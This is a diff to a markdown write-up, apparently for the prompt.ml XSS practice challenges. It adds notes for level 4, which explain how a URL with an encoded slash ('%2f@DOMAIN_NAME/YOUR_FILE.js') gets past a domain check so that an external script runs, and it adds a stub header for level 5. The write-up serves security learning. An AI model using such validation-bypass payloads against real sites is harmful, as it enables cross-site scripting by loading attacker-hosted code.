@@ -135,9 +135,42 @@ Will have use use something other than ```-->``` to close the comment.
 <br>
 
 ## 4
+Credit to [Allen Chou](https://github.com/s3131212), can't solve this without you buddy.
+
 **Explain**
 
-<img width="500" src="https://user-images.githubusercontent.com/68285613/147735285-58067794-8111-4094-a583-2cb3fc4dfab6.png">
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147736329-66c1b077-32d7-46dc-a91c-68820d5cfa4c.png">
+
+The URL format is " user:password@domain/path?parameter#segment ", however " user:password@ " will usually be omitted.
+
+*By using " http://prompt.ml%2f@DOMAIN_NAME/YOUR_FILE.js " will successfully perform prompt(1).*
+
+- ```%2f``` is the url encode of ```/```.
+    - The input condition in ```if()```  is being encoded, however the input is not being encoded in if statement. ```%2f``` will bypass both if condition and statement. 
+- YOUR_FILE.js must contain ```prompt(1)```.
+
+> Taking %2f will not work through if condition, check test.js. 
+
+<br>
+
+**Readings**
+- [In search of the perfect URL validation regex](https://mathiasbynens.be/demo/url-regex)
+
+<br>
+
+**Solve**
+
+I don't have a domain, so was not able to use " http://prompt.ml%2f@DOMAIN_NAME/YOUR_FILE.js ".
+
+<br>
+
+<br>
+
+## 5
+**Explain**
+
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147775277-f3fc0964-8540-4037-ba0e-963930d58243.png">
+
 
 
 
